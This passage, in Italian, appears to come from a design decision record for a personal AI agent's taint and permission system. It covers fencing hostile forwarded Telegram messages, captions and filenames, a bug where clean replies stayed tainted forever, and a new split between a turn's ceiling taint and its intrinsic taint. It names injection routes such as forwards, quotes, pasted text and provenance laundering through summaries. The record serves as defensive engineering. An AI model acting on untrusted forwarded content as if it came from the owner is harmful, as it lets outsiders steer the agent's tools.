   l'append di sessione) — la terza copia che il docstring di `tierOf`
   (`core/surface/types.ts`) nominava già come rischio.

**Trovato cablando, non prima.** Le due scritture dentro `drive` (l'episodio
di memoria, la riga di sessione) leggono un `input: TurnInput` **ricostruito
da `record`** qualche decina di righe più in alto, non l'`input` originale del
chiamante — e `record` non ha `contentTaint` da nessuna parte. Una prima
versione di questa correzione richiamava `initialTaint(input)` anche lì e
restava silenziosamente a tier 0 per quelle due scritture: il test rosso-prima
di questa slice l'ha preso (`expected +0 to be 2`) prima di arrivare a un
judge. La correzione è `record.taint` — il valore che `enqueueTurn`/`runTurn`
avevano già calcolato con `initialTaint` alla creazione della riga — non una
seconda chiamata a `initialTaint` su un `input` che non porta l'informazione.

**Cosa costa, misurato:**

| scenario | prima | dopo |
|---|---|---|
| owner inoltra un messaggio ostile, poi il turno chiama `skill_read` (`maxTaint: 1`) | taint 0 → **allow** | taint 2 → **deny/taint_exceeded** |
| lo stesso messaggio, come episodio di memoria e riga di sessione | `trustTier`/`tier`: 0 (evidenza dell'owner) | 2 |
| messaggio normale dell'owner, nessun allegato | taint 0, testo invariato | taint 0, testo invariato (**invariato**) |
| foto con caption e filename ostile | caption fusa in `text`; filename libero nel ramo "vault non configurato" | entrambi tipizzati, recintati con `fence()`, mai testo libero |

**Test rosso-prima e mutazione.** `connectors/telegram/forward-taint.test.ts`,
nove casi, dal punto d'ingresso di produzione — `Update` reale → `drain()` →
`handle()` → `runTurn()` → kernel vero, `buildRuntime` reale, solo Bot API e
modello sostituiti (stesso schema di `document-arrival.test.ts`/
`group-context.test.ts`, incluso un caso con vault e download reali). (a)
inoltro ostile: fence visibile con la provenienza dichiarata, `skill_read`
negato con `taint_exceeded`, riga di sessione a tier 2 — **questo è il caso
rosso-prima**. (b) messaggio normale: nessun fence, testo byte-identico, tier
0 — anti-regressione. (c) caption+filename ostile, con e senza vault
configurato: entrambi recintati; il filename ostile compare **esattamente una
volta** nell'intero transcript, dentro la fence, mai nella forma libera che il
vecchio `ingest` produceva. Più cinque casi a livello di parser puro su
`parseUpdate`/`composeTurnText`/`contentTaintOf`, incluso il principal — un
forward dall'owner resta principal owner, mai alterato dal contenuto.

Mutazione eseguita a mano: `describeForwardOrigin(message.forward_origin)`
sostituita con `undefined`, sospeso, rilanciato. Cadono quattro test su nove —
(a) esattamente sul fence mancante (mai raggiunge l'assert su
`taint_exceeded`, che sarebbe caduto comunque) e i tre test di parser che
leggono `.forwarded`; (b) e (c), che non dipendono dal forward, restano verdi
— la mutazione è mirata, non un test che si accorge di tutto e non prova
niente. Ripristinata la riga, nove su nove verdi di nuovo.

**Cosa NON copre questo emendamento** (dichiarato in `M5-BIS.md` B16, non
nascosto):

- **L'envelope universale resta fuori.** Nomi, bio, entità, poll, contatti,
  posizione, titolo della chat, MIME/EXIF — la lista che ADR-0046 §2 nomina
  per intero — restano non tipizzati. Nessuna capability dei quattordici
  giorni personali li tocca; post-Gate 1.
- **`quote`/reply non è `forward`.** Un messaggio che *cita* un altro
  messaggio (`ExternalReplyInfo.origin`, distinto da `forward_origin` sul
  tipo `Message`) non passa da questa correzione — stessa famiglia di
  rischio, fuori dal minimo che questa slice aveva in mandato.
- **Il copia-incolla manuale resta indistinguibile.** Chi copia il testo di
  uno sconosciuto e lo incolla come messaggio proprio non porta
  `forward_origin` — Telegram non lo marca lato client, e nessun parser lato
  server può saperlo. Limite della piattaforma, non di questo codice; già
  nominato nell'audit P14 come byte-identico per costruzione.
- **Discord non è toccato.** Stessa forma di difetto, altra superficie —
  `connectors/discord/connector.ts` non legge un equivalente di
  `forward_origin`. Follow-up dichiarato, non silenzioso.

## Riconciliazione — 2026-08-28: due decisioni che si contraddicevano nello stesso file

**La domanda che ha aperto questa sezione non è nata da un audit, è nata
dall'owner che usava Telegram per la prima volta sul serio e ha visto
`fs_write` negato su un "Ciao!".** Misurato sul database reale, non su un
probe: una sessione Telegram (`telegram:987654321`) bloccata a `taint 2` per
oltre venti turni consecutivi, ognuno dei quali rifiutato dal kernel con
`Rifiutato dal kernel dei permessi (taint_exceeded)` — inclusi turni il cui
unico contenuto era "Ciao!" e "Hai visto dove siamo?".

**La catena, ricostruita dai turni veri.** Un turno CLI di ore prima aveva
letto del codice (`fs_read` → `DISK_TIER` 2) e risposto — correttamente, per
§Decisione 2 di questa ADR, taint 2 su quella risposta. Quella risposta è
entrata in memoria a `trustTier: 2`. Un "Ciao!" su Telegram, ore dopo, ha
fatto recall di quel ricordo — `recallTaint` alza il turno a 2, correttamente:
un fatto richiamato è contenuto che il turno sta usando adesso. **Ma la
risposta *nuova* di quel turno — "Ciao! Tutto in ordine" — è stata scritta in
sessione e in memoria essa stessa a `tier: 2`**, perché entrambi i siti
scrivevano `snapshot.currentTaint()`, il tetto del turno, non ciò che il turno
aveva effettivamente prodotto. Il turno successivo ha reiniettato quella
risposta come storia, `historyTaint` l'ha letta a 2, il turno si è aperto a 2
prima di dire una parola, e la *sua* risposta — comunque pulita — è stata
scritta a 2 a sua volta. Nessun punto di uscita: ogni turno pulito riempiva la
finestra di reiniezione con un'altra riga sporca, all'infinito.

**Questo file, lo stesso giorno del 15/08, prometteva il contrario:**

> «Il taint muore con il turno, per disegno (`03-threat-model.md` §2: lo
> scope è il turno, non la sessione). Un file letto ieri non sporca oggi. È
> deliberato e va saputo.» (§Cosa NON copre, versione originale)

**E la revisione del 17/08, comprensibilmente, l'aveva già segnalato come
costo aperto:**

> «La taint fa cricchetto, e la finestra si pulisce più tardi di quanto
> sembri... quindi la finestra torna pulita `MAX_HISTORY_TURNS` messaggi dopo
> **l'ultima risposta sporca**, non dopo la lettura che aveva alzato la
> taint. È corretto — quella risposta *è* derivata dal contenuto tier 3 — ma
> è più lungo di quanto un lettore assuma.»

Il giudice del 17/08 aveva ragione sul meccanismo e aveva sottostimato
l'effetto: "più lungo di quanto sembri" era in pratica "non finisce mai",
perché ogni risposta pulita rientra nella finestra come se fosse sporca
quanto quella che l'ha preceduta, e la finestra non smette mai di essere
rifornita finché la conversazione continua. `03-threat-model.md` §2 non è
mai stata emendata per riconoscere questo — le altre revisioni di questa ADR
dicono esplicitamente "emenda `03-threat-model.md` §X" quando la toccano,
questa no.

### Decisione

**Non si torna al 15/08 (il taint che riparte da zero ha riaperto il
laundering che il probe del 17/08 ha trovato), e non si resta al 17/08 così
com'è (ha reso il costo permanente, non ne ha data la portata).** Si separano
le due domande che la stessa parola — "taint" — teneva insieme:

1. **Cosa un turno può fare adesso** — `PermissionSnapshot.currentTaint()`,
   letto da ogni `decide()`. Deve riflettere tutto ciò che è fisicamente nel
   prompt di questo turno, storia reiniettata e piano inclusi: un turno seduto
   su contenuto sporco non deve poter agire come se fosse pulito. **Invariato
   dal 17/08.**
2. **Cosa un turno scrive di sé stesso per chi lo reinietterà** —
   `PermissionSnapshot.intrinsicTaint()`, nuovo. Riflette solo ciò che questo
   turno ha realmente prodotto o osservato — un tool che ha girato, un recall
   che è scattato — mai un tetto ereditato da una storia o da un piano scritti
   da un turno precedente.

Un terzo metodo, `raiseCeiling`, alza (1) senza alzare (2): è ciò che
`historyTaint` e `planTaint` chiamano oggi al posto di `raiseTaint`, perché
storia reiniettata e piano aperto sono esattamente "reinjected", mai "questo
turno l'ha fatto". `recallTaint` e il tier dichiarato da un tool restano su
`raiseTaint` invariato — quelli *sono* qualcosa che questo turno ha fatto, e
l'argomento del 17/08 su un riassunto che lava la provenienza resta vero
parola per parola per loro.

**Cosa cambia nei numeri.** Nello scenario misurato sopra: il turno che legge
il file resta a taint 2 (invariato — è casa sua). Il turno "Ciao!" che
richiama quel ricordo resta a taint 2 *lui stesso* (il recall è successo
davvero, in quel turno) — ma la *sua* risposta si scrive a `intrinsicTaint()`,
che è 2 solo perché il recall l'ha alzato, non per eredità dalla storia. Il
turno dopo ancora, se non richiama niente di suo, riparte pulito: la sua
risposta non aveva niente da ereditare. La finestra torna a chiudersi
`MAX_HISTORY_TURNS` messaggi dopo l'**ultimo evento vero**, non dopo l'ultima
risposta che si limitava a esistere nella stessa sessione.

### Cosa NON copre

- ~~**`agent/tools/todo.ts`'s `ctx.taint()`** (il tier scritto su un nuovo item
  di piano) resta `snapshot.currentTaint()` — il tetto, non l'intrinseco.~~
  Chiuso il 29/08 — vedi §Chiusura sotto. Trovato leggendo questo file mentre
  si scriveva la riconciliazione, non chiuso qui: `ToolContext.taint` è letto
  da ogni handler esistente e cambiarne il significato era un raggio più ampio
  di quello che quella sessione aveva in mandato.
- **Il residuo teorico è dichiarato, non nascosto.** Una risposta di un turno
  che vede storia sporca *potrebbe* parafrasarla senza che nessun evento
  "intrinseco" lo segnali — `intrinsicTaint()` non guarda il contenuto, guarda
  solo se qualcosa è stato letto/richiamato/eseguito. Il turno originale che
  ha causato il taint resta comunque nella finestra e continua a taintare ogni
  turno che lo reinietta finché non ne esce — la protezione del 17/08 contro
  l'agire-come-se-pulito resta intera; quello che si perde è solo la garanzia
  più forte, mai realmente sostenibile, che ogni eco indiretta resti marcata
  per sempre.

### Riferimenti

`agent/session-history-taint.test.ts` — i quattro scenari del 17/08 restano
verdi invariati (controllano `turns.taint`/`TurnResult.taint`, cioè il
tetto); una quinta descrizione prova che la finestra torna a chiudersi.

## Chiusura — 2026-08-29: il canale gemello che questa ADR aveva lasciato aperto

Il `Cosa NON copre` della riconciliazione del 28/08 nominava il difetto e
diceva perché non era stato chiuso lì: `ToolContext.taint` è letto da ogni
handler registrato, e cambiarne il significato per tutti era un raggio più
ampio del mandato di quella sessione. La domanda aperta, quindi, non era *se*
correggere `agent/tools/todo.ts`, ma se farlo cambiando `ctx.taint()` per
tutti o aggiungendo un secondo campo che solo `todo.ts` legge.

**Grep di ogni chiamante, non supposizione.** `ctx.taint()` ha due soli siti
in `agent/tools/*.ts`: questo file, e `agent/tools/inspect.ts` (`sys_inspect`,
la riga `taint corrente: ${ctx.taint()}` del report diagnostico). Il secondo
vuole esattamente il tetto — è un report su cosa il turno *può fare adesso*,
la stessa domanda che `PermissionSnapshot.currentTaint()` risponde per il
kernel — e cambiarlo a intrinseco lo renderebbe silenziosamente sbagliato per
un turno seduto su una ceiling ereditata ma senza aver ancora fatto nulla di
suo. Nessun terzo chiamante esiste. Quindi: seconda via, non riassegnazione
della prima — lo stesso precedente che questa ADR ha già scelto per
`PermissionSnapshot` stessa (`currentTaint` invariato, `intrinsicTaint`
nuovo), applicato un livello sopra.

**Il cambio.** `ToolContext` guadagna `intrinsicTaint: () => TrustTier`
(`agent/loop.ts`), popolato da `snapshot.intrinsicTaint()` esattamente come
`taint` legge `snapshot.currentTaint()`. `agent/tools/todo.ts` legge il nuovo
campo al posto del vecchio per **entrambe** le azioni che scrivono un tier —
`plan` e `set` condividono la stessa `const tier` letta una volta prima dello
`switch`, e la nota di `set` è testo del modello tanto quanto il testo di
`plan`: la stessa argomentazione di `core/turns/todo.ts` sul perché la riga
porta un tier si applica a entrambe, non solo a chi crea la riga.
`ctx.taint()` resta `currentTaint()` per ogni altro chiamante, invariato.

**Cosa prova il test nuovo.** Un piano scritto in un turno la cui *ceiling* è
sollevata solo da storia reiniettata (`raiseCeiling`, mai qualcosa che quel
turno ha fatto lui) si stampa a tier 0, non al tetto ereditato — la riga letta
direttamente dal `TodoStore`, non dedotta dal comportamento di un turno
successivo. Il test gemello che la riconciliazione del 28/08 aveva già scritto
in `agent/todo-wiring.test.ts` (`il turno che riceve il piano gira alla taint
di chi lo ha scritto`) resta verde senza modifiche: lì il tool che legge la
pagina tainted e la chiamata a `todo plan` sono nello **stesso** turno, quindi
`raiseTaint` — non `raiseCeiling` — ha già alzato anche l'intrinseco prima che
l'handler del piano lo legga. La protezione che quel test prova — un piano che
*davvero* nasce da contenuto sporco resta marcato — non si tocca.

### Riferimenti

`agent/todo-plan-intrinsic-taint.test.ts` — il nuovo scenario, con lo stesso
harness (`Scripted`, `runTurn`) di `session-history-taint.test.ts`.
